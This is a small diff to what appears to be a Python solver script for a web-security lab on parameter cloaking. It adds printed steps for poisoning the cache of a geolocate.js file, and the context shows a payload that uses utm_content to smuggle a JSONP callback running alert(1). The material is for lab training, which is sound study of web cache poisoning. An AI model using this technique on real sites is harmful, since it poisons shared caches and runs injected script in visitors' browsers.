@@ -8,6 +8,9 @@ LAB_NAME = "Parameter cloaking"
 
 
 def run(url, payload=None, proxies=None):
+    print(Fore.YELLOW + f"Steps to solve the lab:")
+    print(Fore.WHITE + f"""1. Inject payload as a query string\n2. Send multiple request to the geolocate.js file to cache it with the injected payload\n""")
+
     url = url.rstrip('/')
 
     payload = """utm_content=hack;callback=alert(1)%3bsetCountryCookie"""
